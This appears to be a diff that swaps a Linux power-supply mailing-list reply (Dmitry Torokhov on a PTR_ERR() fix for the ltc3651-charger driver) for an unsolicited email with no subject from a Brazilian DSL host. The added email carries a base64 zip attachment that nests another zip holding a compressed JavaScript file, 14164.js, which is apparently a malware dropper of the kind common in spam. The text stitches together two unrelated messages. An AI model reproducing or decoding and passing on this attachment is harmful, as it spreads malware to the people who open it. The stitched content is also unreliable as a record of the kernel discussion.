@@ -1,75 +1,70 @@
-From: Dmitry Torokhov <dmitry.torokhov@gmail.com>
-Subject: Re: [PATCH -next] power: supply: ltc3651-charger: Fix wrong pointer
- passed to PTR_ERR()
-Date: Fri, 19 May 2017 15:07:08 -0700
-Message-ID: <20170519220708.GG19281@dtor-ws>
-References: <20170517121132.7052-1-weiyj.lk@gmail.com>
- <20170519005948.GA34310@dtor-ws>
- <6AADFAC011213A4C87B956458587ADB47F6B4A@SZXEMI508-MBX.china.huawei.com>
+From: <brian@oakcrestfuneralservices.com>
+Subject: (unknown)
+Date: Sat, 20 May 2017 00:26:32 -0000
+Message-ID: <149523999278.19077.125217862245481764@brasiltelecom.net.br>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="843245271.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-pm-owner@vger.kernel.org>
-Received: from mail-pg0-f44.google.com ([74.125.83.44]:36437 "EHLO
-        mail-pg0-f44.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751704AbdESWHM (ORCPT
-        <rfc822;linux-pm@vger.kernel.org>); Fri, 19 May 2017 18:07:12 -0400
-Received: by mail-pg0-f44.google.com with SMTP id x64so43644682pgd.3
-        for <linux-pm@vger.kernel.org>; Fri, 19 May 2017 15:07:11 -0700 (PDT)
-Content-Disposition: inline
-In-Reply-To: <6AADFAC011213A4C87B956458587ADB47F6B4A@SZXEMI508-MBX.china.huawei.com>
+Received: from 189-73-108-12.fnsce702.dsl.brasiltelecom.net.br ([189.73.108.12]:37784
+        "HELO brasiltelecom.net.br" rhost-flags-OK-OK-OK-FAIL)
+        by vger.kernel.org with SMTP id S1753708AbdETA0j (ORCPT
+        <rfc822;linux-pm@vger.kernel.org>); Fri, 19 May 2017 20:26:39 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-pm-owner@vger.kernel.org
 List-Id: linux-pm@vger.kernel.org
-To: "weiyongjun (A)" <weiyongjun1@huawei.com>
-Cc: Wei Yongjun <weiyj.lk@gmail.com>, Sebastian Reichel <sre@kernel.org>, "linux-pm@vger.kernel.org" <linux-pm@vger.kernel.org>
+To: linux-pm@vger.kernel.org
 
-Hi Wei,
-
-On Fri, May 19, 2017 at 01:27:51AM +0000, weiyongjun (A) wrote:
-> Hi, Dmitry
-> 
-> > Subject: Re: [PATCH -next] power: supply: ltc3651-charger: Fix wrong pointer
-> > passed to PTR_ERR()
-> > 
-> > On Wed, May 17, 2017 at 12:11:32PM +0000, Wei Yongjun wrote:
-> > > From: Wei Yongjun <weiyongjun1@huawei.com>
-> > >
-> > > PTR_ERR should access the value just tested by IS_ERR, otherwise
-> > > the wrong error code will be returned.
-> > >
-> > > Signed-off-by: Wei Yongjun <weiyongjun1@huawei.com>
-> > 
-> > This does fix the issue, but maybe we want to use PTR_ERR_OR_ZERO()?
-> > 
-> > 	ltc3651_charger->acpr_gpio = devm_gpiod_get(&pdev->dev,
-> > 					"lltc,acpr", GPIOD_IN);
-> > 	ret = PTR_ERR_OR_ZERO(ltc3651_charger->acpr_gpio);
-> > 	if (ret)
-> > 		...
-> > 
-> > Or even
-> > 
-> > 	err = PTR_ERR_OR_ZERO((ltc3651_charger->acpr_gpio =
-> > 		devm_gpiod_get(&pdev->dev, "lltc,acpr", GPIOD_IN)));
-> > 	if (err)
-> > 		...
-> > 
-> > To make sure we never mix up pointer. Maybe we need
-> > ERR_OR_ASSIGN(ptr1,
-> > ptr2) to avoid the ugly assignment in argument above...
-> > 
-> 
-> I have checked devm_gpiod_get() and seems it never return NULL.  And the other
-> places call devm_gpiod_get() never check for NULL return. So I think PTR_ERR_OR_ZERO()
-> is not need here.
-
-The request to use PTR_ERR_OR_ZERO() had nothing to do with
-devm_gpiod_get() returning NULL and everything with reducing number of
-times one has to write "ltc3651_charger->acpr_gpio". The original
-problem was that we checked the wrong value, if we provide macro
-incorporating assignment and conversion to an error code in one step
-this will reduce number of times we screw up like that in the future.
-
-Thanks.
-
--- 
-Dmitry
+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
